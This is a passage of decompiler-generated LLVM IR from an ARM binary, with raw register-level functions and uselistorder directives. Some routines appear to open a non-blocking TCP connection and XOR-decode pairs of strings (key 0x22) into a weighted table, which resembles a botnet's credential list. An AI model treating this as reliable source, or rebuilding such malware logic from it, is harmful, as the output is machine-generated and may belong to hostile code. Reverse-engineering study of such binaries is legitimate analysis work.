  %v1_fd80 = add i32 %v0_fd80, 9
  %v2_fd80 = inttoptr i32 %v1_fd80 to i8*
  %v3_fd80 = load i8, i8* %v2_fd80, align 1
  %v4_fd80 = zext i8 %v3_fd80 to i32
  store i32 %v4_fd80, i32* %r3.global-to-local, align 4
  %v1_fd84 = add i32 %v0_fd80, 8
  %v2_fd84 = inttoptr i32 %v1_fd84 to i8*
  %v3_fd84 = load i8, i8* %v2_fd84, align 1
  %v4_fd84 = zext i8 %v3_fd84 to i32
  %v4_fd88 = mul nuw nsw i32 %v4_fd80, 256
  %v5_fd88 = or i32 %v4_fd84, %v4_fd88
  store i32 %v5_fd88, i32* %r0.global-to-local, align 4
  %v1_fd8c = call i32 @function_14a40(i32 %v5_fd88)
  store i32 %v1_fd8c, i32* %r0.global-to-local, align 4
  %v1_fd90 = load i32, i32* @r8, align 4
  %v2_fd90 = add i32 %v1_fd90, %v1_fd8c
  br label %dec_label_pc_fbd4.backedge

; uselistorder directives
  uselistorder i32 %v10_fd60, { 1, 0, 2 }
  uselistorder i32 %v3_fd58, { 1, 0 }
  uselistorder i32 %v2_fce8, { 1, 0 }
  uselistorder i32 %v3_fc68, { 0, 2, 1 }
  uselistorder i32 %v1_fce865, { 1, 0 }
  uselistorder i32 %v1_fce4, { 1, 2, 0 }
  uselistorder i32 %v2_fcd8, { 1, 0 }
  uselistorder i32 %v3_fbf4, { 0, 2, 1 }
  uselistorder i32 %v1_fcd849, { 1, 0 }
  uselistorder i32 %v1_fcd4, { 1, 2, 0 }
  uselistorder i1 %v7_fbdc, { 1, 0 }
  uselistorder i32 %v1_fbd4, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_fc90, { 0, 2, 1 }
  uselistorder i32 %v2_fc8c, { 1, 2, 0 }
  uselistorder i32 %v0_fce0, { 2, 0, 1 }
  uselistorder i32 %v1_fce8, { 1, 2, 0 }
  uselistorder i32 %v3_fc7028, { 1, 0 }
  uselistorder i32 %v3_fc6826, { 1, 0, 2 }
  uselistorder i32 %v0_fcac, { 1, 0, 3, 2 }
  uselistorder i32 %v0_fc54, { 1, 0, 2 }
  uselistorder i32 %v3_fc1c, { 0, 2, 1 }
  uselistorder i32 %v2_fc18, { 1, 2, 0 }
  uselistorder i32 %v0_fcd0, { 2, 0, 1 }
  uselistorder i32 %v1_fcd8, { 1, 2, 0 }
  uselistorder i32 %v3_fbfc22, { 1, 0 }
  uselistorder i32 %v3_fbf420, { 1, 0, 2 }
  uselistorder i32 %v0_fbe8, { 3, 0, 2, 1 }
  uselistorder i1 %v7_fbdc140, { 1, 0 }
  uselistorder i32 %v1_fbd4133, { 1, 0 }
  uselistorder i1 %v9_fbb4, { 1, 0 }
  uselistorder i32 %v0_fb74, { 1, 0 }
  uselistorder i32 %v0_fb68, { 1, 0, 2 }
  uselistorder i32 %v0_fb58, { 1, 0 }
  uselistorder i32 %v0_fb30, { 1, 0 }
  uselistorder i1 %v7_fadc, { 1, 0 }
  uselistorder i32 %v5_fad8, { 1, 0, 2 }
  uselistorder i32 %v1_faa0, { 1, 0 }
  uselistorder i32 %v3_fa8c, { 1, 0 }
  uselistorder i32 %v0_fa84, { 1, 0 }
  uselistorder i32 %v1_fa78, { 1, 2, 0 }
  uselistorder i1 %v7_fa30, { 1, 0 }
  uselistorder i32 %v4_fa2c, { 1, 0, 2 }
  uselistorder i1 %v7_fa14, { 1, 0 }
  uselistorder i32 %v3_fa10, { 1, 0, 2 }
  uselistorder i1 %v7_f9f8, { 1, 0 }
  uselistorder i32 %v3_f9f4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f9dc, { 2, 1, 0 }
  uselistorder i32 %v1_f9e0, { 1, 0 }
  uselistorder i32 %v2_fa90, { 1, 0, 2 }
  uselistorder i32 %v2_fa6c, { 1, 0, 2 }
  uselistorder i32 %v1_f9c8, { 1, 0 }
  uselistorder i32 %v2_f958, { 1, 0, 2, 3 }
  uselistorder i32 %v6_f944, { 1, 2, 0 }
  uselistorder i64 %v5_f940, { 0, 2, 1 }
  uselistorder i32 %v1_f92c, { 1, 0, 2 }
  uselistorder i32 %v1_f8e4, { 1, 0 }
  uselistorder i32 %v1_f8e0, { 1, 2, 0 }
  uselistorder i32 %v2_f8dc, { 1, 0 }
  uselistorder i1 %v8_f8c8, { 1, 0 }
  uselistorder i32 %v2_f8a0, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp78, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 31, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 32 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 9, 6, 1, 8, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 6, 8, 5, 1, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 21, 20, 22, 19 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 10, 7, 8, 9, 15, 12, 11, 13, 14, 19, 16, 17, 18, 22, 20, 21, 23, 26, 24, 25, 27, 30, 28, 29, 31, 33, 32, 35, 34, 36, 37, 38, 41, 40, 39, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 11, 5, 16, 6, 7, 17, 8, 9, 10, 2, 12, 13, 14, 15, 1, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 28, 29, 30, 35, 32, 33, 31, 34, 37 }
  uselistorder i32 (i32)* @function_15c58, { 8, 7, 6, 4, 3, 2, 5, 1, 0 }
  uselistorder label %dec_label_pc_fd80, { 1, 0 }
  uselistorder label %dec_label_pc_fc68.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fbf4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fbd4.backedge, { 1, 0 }
  uselistorder label %bb121, { 1, 0 }
  uselistorder label %dec_label_pc_fc78, { 1, 0 }
  uselistorder label %dec_label_pc_fc78.preheader, { 1, 0 }
  uselistorder label %bb119, { 1, 0 }
  uselistorder label %dec_label_pc_fc04, { 1, 0 }
  uselistorder label %dec_label_pc_fc04.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_fbe8, { 1, 0 }
  uselistorder label %dec_label_pc_fb74, { 1, 0 }
  uselistorder label %dec_label_pc_fb60, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fb40, { 2, 1, 4, 0, 3 }
  uselistorder label %bb117, { 1, 0 }
  uselistorder label %bb114, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f8c0, { 1, 0 }
}

define i32 @function_fd98(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd98:
  %v2_fda4 = load i32, i32* @global_var_22980.192, align 4
  store i32 %v2_fda4, i32* @r0, align 4
  %v2_fdac = call i32 @function_14e24(i32 %v2_fda4, i32 9)
  ret i32 %v2_fdac

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_14e24, { 13, 10, 9, 12, 11, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_fdc0() local_unnamed_addr {
dec_label_pc_fdc0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fdc0 = load i32, i32* @r4, align 4
  store i32 %v3_fdc0, i32* %stack_var_-16, align 4
  %v6_fdc0 = load i32, i32* @r5, align 4
  %v9_fdc0 = load i32, i32* @r6, align 4
  %v12_fdc0 = load i32, i32* @lr, align 4
  %v0_fdc4 = load i32, i32* @r0, align 4
  store i32 %v0_fdc4, i32* @r5, align 4
  %v1_fdc8 = add i32 %v0_fdc4, 4
  %v2_fdc8 = inttoptr i32 %v1_fdc8 to i32*
  %v3_fdc8 = load i32, i32* %v2_fdc8, align 4
  store i32 %v3_fdc8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 65004, i32* @lr, align 4
  %v1_fde8 = icmp ne i32 %v3_fdc8, -1
  call void @__pseudo_cond_branch(i1 %v1_fde8, i32 ptrtoint (i32* @global_var_15b6c.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_fdf4 = load i32, i32* @r6, align 4
  store i32 %v0_fdf4, i32* %r2.global-to-local, align 4
  %v3_fdf8 = call i32 @function_14ba0(i32 2, i32 1, i32 %v0_fdf4)
  store i32 %v3_fdf8, i32* %r0.global-to-local, align 4
  %v7_fdfc = icmp eq i32 %v3_fdf8, -1
  %v1_fe00 = load i32, i32* @r5, align 4
  %v2_fe00 = add i32 %v1_fe00, 4
  %v3_fe00 = inttoptr i32 %v2_fe00 to i32*
  store i32 %v3_fdf8, i32* %v3_fe00, align 4
  br i1 %v7_fdfc, label %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge, label %dec_label_pc_fe08

dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge:    ; preds = %dec_label_pc_fdc0
  %v1_fe80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe78

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdc0
  %v2_fdcc = ptrtoint i32* %stack_var_-32 to i32
  %v0_fe08 = load i32, i32* @r5, align 4
  %v1_fe08 = add i32 %v0_fe08, 28
  store i32 %v1_fe08, i32* %r0.global-to-local, align 4
  %v0_fe0c = load i32, i32* @r6, align 4
  %v2_fe0c = add i32 %v0_fe08, 24
  %v3_fe0c = inttoptr i32 %v2_fe0c to i32*
  store i32 %v0_fe0c, i32* %v3_fe0c, align 4
  %v2_fe14 = call i32 @function_12404(i32 %v1_fe08, i32 256)
  store i32 %v2_fe14, i32* %r0.global-to-local, align 4
  %v0_fe18 = load i32, i32* @r5, align 4
  %v1_fe18 = add i32 %v0_fe18, 4
  %v2_fe18 = inttoptr i32 %v1_fe18 to i32*
  %v3_fe18 = load i32, i32* %v2_fe18, align 4
  store i32 %v3_fe18, i32* @r4, align 4
  %v0_fe1c = load i32, i32* @r6, align 4
  store i32 %v0_fe1c, i32* %r2.global-to-local, align 4
  store i32 %v3_fe18, i32* %r0.global-to-local, align 4
  %v3_fe28 = call i32 @function_12fb4(i32 %v3_fe18, i32 3, i32 %v0_fe1c)
  %v1_fe30 = or i32 %v3_fe28, 2048
  store i32 %v1_fe30, i32* %r2.global-to-local, align 4
  %v0_fe34 = load i32, i32* @r4, align 4
  store i32 %v0_fe34, i32* %r0.global-to-local, align 4
  %v3_fe38 = call i32 @function_12fb4(i32 %v0_fe34, i32 4, i32 %v1_fe30)
  store i32 %v3_fe38, i32* %r0.global-to-local, align 4
  %v2_fe40 = load i32, i32* @global_var_223e8.194, align 4
  store i32 %v2_fe40, i32* %r2.global-to-local, align 4
  %v1_fe48 = load i32, i32* @r5, align 4
  %v2_fe48 = add i32 %v1_fe48, 12
  %v3_fe48 = inttoptr i32 %v2_fe48 to i32*
  store i32 1, i32* %v3_fe48, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_fe54 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe54 = load i32, i32* @r5, align 4
  %v2_fe54 = add i32 %v1_fe54, 8
  %v3_fe54 = inttoptr i32 %v2_fe54 to i32*
  store i32 %v0_fe54, i32* %v3_fe54, align 4
  %v0_fe58 = load i32, i32* @r5, align 4
  %v1_fe5c = add i32 %v0_fe58, 4
  %v2_fe5c = inttoptr i32 %v1_fe5c to i32*
  %v3_fe5c = load i32, i32* %v2_fe5c, align 4
  store i32 %v3_fe5c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fe74 = call i32 @function_147e4(i32 %v3_fe5c, i32 %v2_fdcc, i32 16)
  store i32 %v3_fe74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe78

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge, %dec_label_pc_fe08
  %v1_fe80 = phi i32 [ %v1_fe80.pre, %dec_label_pc_fdc0.dec_label_pc_fe78_crit_edge ], [ %v3_fe74, %dec_label_pc_fe08 ]
  %v2_fe7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fe7c, i32* @r4, align 4
  store i32 %v6_fdc0, i32* @r5, align 4
  store i32 %v9_fdc0, i32* @r6, align 4
  store i32 %v12_fdc0, i32* @lr, align 4
  ret i32 %v1_fe80

; uselistorder directives
  uselistorder i32 %v3_fdf8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @function_12404, { 10, 12, 16, 15, 14, 13, 9, 8, 7, 11, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_fe78, { 1, 0 }
}

define i32 @function_fe88(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fe88:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_fe88 = load i32, i32* @r4, align 4
  %v6_fe88 = load i32, i32* @r5, align 4
  %v9_fe88 = load i32, i32* @r6, align 4
  %v12_fe88 = load i32, i32* @r7, align 4
  %v15_fe88 = load i32, i32* @r8, align 4
  %v18_fe88 = load i32, i32* @sb, align 4
  %v21_fe88 = load i32, i32* @sl, align 4
  %v24_fe88 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_223b4.196 to i32), i32* @fp, align 4
  %v2_fe90 = load i32, i32* @global_var_223b4.196, align 4
  store i32 ptrtoint (i32* @global_var_223e0.198 to i32), i32* @sl, align 4
  %v1_fe9c = add i32 %v2_fe90, 1
  store i32 %v1_fe9c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_fea8 = load i32, i32* @global_var_223e0.198, align 4
  store i32 %v2_fea8, i32* %r0.global-to-local, align 4
  %v3_feac = mul i32 %v1_fe9c, 16
  store i32 %v3_feac, i32* %r1.global-to-local, align 4
  %v4_feb4 = call i32 @function_14414(i32 %v2_fea8, i32 %v3_feac, i32 %arg3, i32 %v1_fe9c)
  %v2_feb8 = load i32, i32* @global_var_223b4.196, align 4
  store i32 %v2_feb8, i32* %r2.global-to-local, align 4
  store i32 %v4_feb4, i32* @r8, align 4
  %v0_fec0 = load i32, i32* @r5, align 4
  store i32 %v0_fec0, i32* %r0.global-to-local, align 4
  %v1_fec8 = load i32, i32* @sl, align 4
  %v2_fec8 = inttoptr i32 %v1_fec8 to i32*
  store i32 %v4_feb4, i32* %v2_fec8, align 4
  %v1_fecc = inttoptr i32 %v0_fec0 to i8*
  %v2_fecc = call i32 @function_12370(i8* %v1_fecc)
  %sext = mul i32 %v2_fecc, 16777216
  %v1_fed0 = sdiv i32 %sext, 16777216
  %v2_fed0 = add nsw i32 %v1_fed0, 1
  store i32 %v2_fed0, i32* @r4, align 4
  store i32 %v1_fed0, i32* @r7, align 4
  store i32 %v2_fed0, i32* @r0, align 4
  %v0_fedc = call i32 @function_13cc8()
  store i32 %v0_fedc, i32* %r0.global-to-local, align 4
  %v0_fee0 = load i32, i32* @r5, align 4
  store i32 %v0_fee0, i32* %r1.global-to-local, align 4
  %v0_fee4 = load i32, i32* @r4, align 4
  store i32 %v0_fee4, i32* %r2.global-to-local, align 4
  store i32 %v0_fedc, i32* %r6.global-to-local, align 4
  %v3_feec = call i32 @function_123e0(i32 %v0_fedc, i32 %v0_fee0, i32 %v0_fee4)
  store i32 %v3_feec, i32* %r0.global-to-local, align 4
  %v0_fef0 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_fef0, 1
  %extract.t6 = trunc i32 %v0_fef0 to i8
  br i1 %tmp22, label %dec_label_pc_ff14, label %dec_label_pc_fef8

dec_label_pc_fef8:                                ; preds = %dec_label_pc_fe88
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fefc

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_fef8
  %v2_ff04 = phi i32 [ %v1_ff08, %dec_label_pc_fefc ], [ 0, %dec_label_pc_fef8 ]
  %v1_fefc = load i32, i32* %r6.global-to-local, align 4
  %v2_fefc = add i32 %v1_fefc, %v2_ff04
  %v3_fefc = inttoptr i32 %v2_fefc to i8*
  %v4_fefc = load i8, i8* %v3_fefc, align 1
  %v6_fefc = zext i8 %v4_fefc to i32
  %v1_ff00 = xor i32 %v6_fefc, 34
  store i32 %v1_ff00, i32* %r3.global-to-local, align 4
  %v1_ff04 = trunc i32 %v1_ff00 to i8
  store i8 %v1_ff04, i8* %v3_fefc, align 1
  %v0_ff08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff08 = add i32 %v0_ff08, 1
  store i32 %v1_ff08, i32* %r2.global-to-local, align 4
  %v1_ff0c = load i32, i32* @r7, align 4
  %v9_ff0c = icmp eq i32 %v1_ff08, %v1_ff0c
  br i1 %v9_ff0c, label %dec_label_pc_ff14.loopexit, label %dec_label_pc_fefc

dec_label_pc_ff14.loopexit:                       ; preds = %dec_label_pc_fefc
  %extract.t = trunc i32 %v1_ff08 to i8
  br label %dec_label_pc_ff14

dec_label_pc_ff14:                                ; preds = %dec_label_pc_ff14.loopexit, %dec_label_pc_fe88
  %v0_ff24.off0 = phi i8 [ %extract.t, %dec_label_pc_ff14.loopexit ], [ %extract.t6, %dec_label_pc_fe88 ]
  %v2_ff14 = load i32, i32* @global_var_223b4.196, align 4
  %v2_ff18 = load i32, i32* @global_var_223e0.198, align 4
  %v3_ff1c = mul i32 %v2_ff14, 16
  store i32 %v3_ff1c, i32* @sb, align 4
  %v2_ff20 = add i32 %v2_ff18, %v3_ff1c
  store i32 %v2_ff20, i32* %r2.global-to-local, align 4
  %v3_ff24 = add i32 %v2_ff20, 12
  %v4_ff24 = inttoptr i32 %v3_ff24 to i8*
  store i8 %v0_ff24.off0, i8* %v4_ff24, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_feb8, i32* %r3.global-to-local, align 4
  %v0_ff30 = load i32, i32* %r6.global-to-local, align 4
  %v1_ff30 = load i32, i32* @r8, align 4
  %v5_ff30 = mul i32 %v2_feb8, 16
  %v6_ff30 = add i32 %v1_ff30, %v5_ff30
  %v7_ff30 = inttoptr i32 %v6_ff30 to i32*
  store i32 %v0_ff30, i32* %v7_ff30, align 4
  %v2_ff34 = load i32, i32* @global_var_223e0.198, align 4
  store i32 %v2_ff34, i32* @r7, align 4
  %v1_ff38 = inttoptr i32 %arg2 to i8*
  %v2_ff38 = call i32 @function_12370(i8* %v1_ff38)
  %sext1 = mul i32 %v2_ff38, 16777216
  %v1_ff3c = sdiv i32 %sext1, 16777216
  %v2_ff3c = add nsw i32 %v1_ff3c, 1
  store i32 %v2_ff3c, i32* @r4, align 4
  store i32 %v1_ff3c, i32* @r6, align 4
  store i32 %v2_ff3c, i32* @r0, align 4
  %v0_ff48 = call i32 @function_13cc8()
  store i32 %v0_ff48, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ff50 = load i32, i32* @r4, align 4
  store i32 %v0_ff50, i32* %r2.global-to-local, align 4
  store i32 %v0_ff48, i32* %r5.global-to-local, align 4
  %v3_ff58 = call i32 @function_123e0(i32 %v0_ff48, i32 %arg2, i32 %v0_ff50)
  store i32 %v3_ff58, i32* %r0.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ff5c, 1
  %extract.t8 = trunc i32 %v0_ff5c to i8
  br i1 %tmp23, label %dec_label_pc_ff80, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff14
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff68, %dec_label_pc_ff64
  %v2_ff70 = phi i32 [ %v1_ff74, %dec_label_pc_ff68 ], [ 0, %dec_label_pc_ff64 ]
  %v1_ff68 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff68 = add i32 %v1_ff68, %v2_ff70
  %v3_ff68 = inttoptr i32 %v2_ff68 to i8*
  %v4_ff68 = load i8, i8* %v3_ff68, align 1
  %v6_ff68 = zext i8 %v4_ff68 to i32
  %v1_ff6c = xor i32 %v6_ff68, 34
  store i32 %v1_ff6c, i32* %r3.global-to-local, align 4
  %v1_ff70 = trunc i32 %v1_ff6c to i8
  store i8 %v1_ff70, i8* %v3_ff68, align 1
  %v0_ff74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff74 = add i32 %v0_ff74, 1
  store i32 %v1_ff74, i32* %r2.global-to-local, align 4
  %v1_ff78 = load i32, i32* @r6, align 4
  %v9_ff78 = icmp eq i32 %v1_ff74, %v1_ff78
  br i1 %v9_ff78, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_ff68

dec_label_pc_ff80.loopexit:                       ; preds = %dec_label_pc_ff68
  %extract.t7 = trunc i32 %v1_ff74 to i8
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff80.loopexit, %dec_label_pc_ff14
  %v0_ff90.off0 = phi i8 [ %extract.t7, %dec_label_pc_ff80.loopexit ], [ %extract.t8, %dec_label_pc_ff14 ]
  %v2_ff80 = load i32, i32* @global_var_223b4.196, align 4
  store i32 %v2_ff80, i32* %r0.global-to-local, align 4
  %v2_ff84 = load i32, i32* @global_var_223e0.198, align 4
  %v3_ff88 = mul i32 %v2_ff80, 16
  store i32 %v3_ff88, i32* %r1.global-to-local, align 4
  %v2_ff8c = or i32 %v3_ff88, 13
  %v3_ff90 = add i32 %v2_ff8c, %v2_ff84
  %v4_ff90 = inttoptr i32 %v3_ff90 to i8*
  store i8 %v0_ff90.off0, i8* %v4_ff90, align 1
  store i32 ptrtoint (i16** @global_var_223e4.200 to i32), i32* %r4.global-to-local, align 4
  %v2_ff9c = load i16, i16* bitcast (i16** @global_var_223e4.200 to i16*), align 4
  %v3_ff9c = zext i16 %v2_ff9c to i32
  store i32 %v3_ff9c, i32* %lr.global-to-local, align 4
  %v2_ffa4 = load i32, i32* @global_var_223e0.198, align 4
  store i32 %v2_ffa4, i32* %r2.global-to-local, align 4
  %v0_ffac = load i32, i32* %r1.global-to-local, align 4
  %v2_ffac = add i32 %v0_ffac, %v2_ffa4
  store i32 %v2_ffac, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_223e4.200 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ffb4 = load i32, i32* @sb, align 4
  %v1_ffb4 = load i32, i32* @r7, align 4
  %v2_ffb4 = add i32 %v1_ffb4, %v0_ffb4
  store i32 %v2_ffb4, i32* %ip.global-to-local, align 4
  %v0_ffb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_ffb8 = add i32 %v0_ffb8, 1
  store i32 %v1_ffb8, i32* %r0.global-to-local, align 4
  %v3_ffbc = add i32 %v2_ffac, 10
  %v4_ffbc = inttoptr i32 %v3_ffbc to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_223e4.200 to i32), i32 16), i32 16) to i16), i16* %v4_ffbc, align 2
  %v0_ffc0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ffc0 = trunc i32 %v0_ffc0 to i16
  %v2_ffc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_ffc0 = add i32 %v2_ffc0, 8
  %v4_ffc0 = inttoptr i32 %v3_ffc0 to i16*
  store i16 %v1_ffc0, i16* %v4_ffc0, align 2
  %v0_ffc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_ffc4 = load i32, i32* %ip.global-to-local, align 4
  %v2_ffc4 = add i32 %v1_ffc4, 4
  %v3_ffc4 = inttoptr i32 %v2_ffc4 to i32*
  store i32 %v0_ffc4, i32* %v3_ffc4, align 4
  %v1_ffc8 = load i32, i32* @fp, align 4
  %v2_ffc8 = inttoptr i32 %v1_ffc8 to i32*
  store i32 %v1_ffb8, i32* %v2_ffc8, align 4
  %v0_ffcc = load i32, i32* %r3.global-to-local, align 4
  %v1_ffcc = trunc i32 %v0_ffcc to i16
  %v2_ffcc = load i32, i32* %r4.global-to-local, align 4
  %v3_ffcc = inttoptr i32 %v2_ffcc to i16*
  store i16 %v1_ffcc, i16* %v3_ffcc, align 2
  store i32 %v3_fe88, i32* @r4, align 4
  store i32 %v6_fe88, i32* @r5, align 4
  store i32 %v9_fe88, i32* @r6, align 4
  store i32 %v12_fe88, i32* @r7, align 4
  store i32 %v15_fe88, i32* @r8, align 4
  store i32 %v18_fe88, i32* @sb, align 4
  store i32 %v21_fe88, i32* @sl, align 4
  store i32 %v24_fe88, i32* @fp, align 4
  ret i32 %v1_ffb8

; uselistorder directives
  uselistorder i32 %v3_ff88, { 1, 0 }
  uselistorder i32 %v1_ff74, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ff48, { 1, 0, 2 }
  uselistorder i32 %v3_ff1c, { 1, 0 }
  uselistorder i32 %v1_ff08, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fedc, { 1, 0, 2 }
  uselistorder i32 %v2_feb8, { 1, 0, 2 }
  uselistorder i32 %v3_feac, { 1, 0 }
  uselistorder i32 %v1_fe9c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @function_12370, { 27, 28, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 84, 85, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32 (i32, i32, i32, i32)* @function_14414, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_ffe8() local_unnamed_addr {
dec_label_pc_ffe8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp273 = call i32 @__decompiler_undefined_function_0()
  %tmp274 = call i32 @__decompiler_undefined_function_0()
  %tmp275 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_fff4 = call i32 @function_14c98()
  store i32 %v0_fff4, i32* %r0.global-to-local, align 4
  %v7_fff8 = icmp eq i32 %v0_fff4, -1
  %. = zext i1 %v7_fff8 to i32
  %tmp308 = icmp slt i32 %v0_fff4, 1
  %storemerge268 = select i1 %tmp308, i32 %., i32 1
  store i32 %storemerge268, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22980.192 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10014 = icmp eq i32 %storemerge268, 0
  store i1 %v2_10014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_fff4, i32* @global_var_22980.192, align 4
  br i1 %v2_10014, label %dec_label_pc_10030, label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_ffe8
  ret i32 %v0_fff4

dec_label_pc_10030:                               ; preds = %dec_label_pc_ffe8
  %v0_10030 = call i32 @function_1262c()
  store i32 %v0_10030, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2295c.90 to i32), i32* %r1.global-to-local, align 4
